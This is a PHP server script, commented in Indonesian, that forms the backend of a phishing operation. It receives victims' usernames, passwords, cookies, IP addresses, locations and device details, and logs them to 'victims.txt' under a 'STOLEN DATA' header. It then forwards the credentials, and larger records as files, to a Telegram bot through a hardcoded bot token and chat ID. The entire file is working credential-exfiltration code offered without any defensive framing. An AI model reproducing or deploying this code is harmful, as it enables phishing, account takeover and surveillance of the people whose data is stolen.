<?php
// server.php dengan Telegram integration
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    // 1. Simpan ke file lokal
    $log = "=== STOLEN DATA ===\n";
    $log .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    $log .= "Username: " . ($data['username'] ?? 'N/A') . "\n";
    $log .= "Password: " . ($data['password'] ?? 'N/A') . "\n";
    $log .= "IP: " . ($data['ip'] ?? 'N/A') . "\n";
    $log .= "Location: " . ($data['location'] ?? 'N/A') . "\n";
    $log .= "Coords: " . ($data['coords'] ?? 'N/A') . "\n";
    $log .= "ISP: " . ($data['isp'] ?? 'N/A') . "\n";
    $log .= "Device: " . ($data['device'] ?? 'N/A') . "\n";
    $log .= "Cookies: " . substr($data['cookies'] ?? 'N/A', 0, 500) . "\n";
    $log .= "=====================\n\n";
    
    file_put_contents('victims.txt', $log, FILE_APPEND);
    
    // 2. Kirim ke Telegram sebagai backup
    $botToken = '8486130443:AAHwGtsjyluGSoG5w2MmF1lkJYXsJ6VeIyU';
    $chatId = '7756877885';
    
    $telegramMessage = "🆕 New Victim\n";
    $telegramMessage .= "IP: " . ($data['ip'] ?? 'N/A') . "\n";
    $telegramMessage .= "User: " . ($data['username'] ?? 'N/A') . "\n";
    $telegramMessage .= "Pass: " . ($data['password'] ?? 'N/A') . "\n";
    $telegramMessage .= "Location: " . ($data['location'] ?? 'N/A') . "\n";
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $telegramMessage,
        'parse_mode' => 'HTML'
    ];
    
    // Gunakan cURL untuk kirim ke Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    // 3. Kirim data lengkap sebagai file (jika besar)
    if (strlen(json_encode($data)) > 1000) {
        $fileContent = json_encode($data, JSON_PRETTY_PRINT);
        $fileName = 'victim_' . ($data['ip'] ?? 'unknown') . '_' . time() . '.json';
        file_put_contents($fileName, $fileContent);
        
        // Kirim file ke Telegram
        $fileUrl = "https://api.telegram.org/bot{$botToken}/sendDocument";
        $postFileData = [
            'chat_id' => $chatId,
            'document' => new CURLFile($fileName)
        ];
        
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, $fileUrl);
        curl_setopt($ch2, CURLOPT_POST, true);
        curl_setopt($ch2, CURLOPT_POSTFIELDS, $postFileData);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch2);
        curl_close($ch2);
        
        unlink($fileName); // Hapus file setelah dikirim
    }
    
    echo 'OK';
} else {
    echo 'No data';
}
?>